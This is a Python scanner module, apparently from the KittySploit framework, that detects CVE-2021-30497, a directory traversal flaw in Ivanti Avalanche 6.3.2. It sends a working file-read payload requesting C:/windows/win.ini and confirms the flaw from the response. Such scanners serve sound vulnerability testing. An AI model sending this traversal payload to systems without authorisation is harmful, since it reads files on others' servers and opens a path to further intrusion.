#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ivanti Avalanche 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ivanti Avalanche 6.3.2 - Local File Inclusion Detection',
        'description': "Ivanti Avalanche 6.3.2 is vulnerable to local file inclusion because it allows remote unauthenticated user to access files that reside outside the 'image' folder.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'avalanche', 'traversal', 'lfi', 'ivanti', 'windows', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://ssd-disclosure.com/ssd-advisory-ivanti-avalanche-directory-traversal/',
            'https://forums.ivanti.com/s/article/Security-Alert-CVE-2021-30497-Directory-Traversal-Vulnerability?language=en_US',
            'https://help.ivanti.com/wl/help/en_us/aod/5.4/Avalanche/Console/Launching_the_Avalanche.htm',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30497',
            'https://github.com/StarCrossPortal/scalpel',
        ],
        'cve': 'CVE-2021-30497',
    }

    def run(self):
        r = self.http_request(method="GET", path='/AvalancheWeb/image?imageFilePath=C:/windows/win.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('for 16-bit app support',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Ivanti Avalanche 6.3.2 - Local File Inclusion detected",
                path='/AvalancheWeb/image?imageFilePath=C:/windows/win.ini',
            )
            return True
        return False

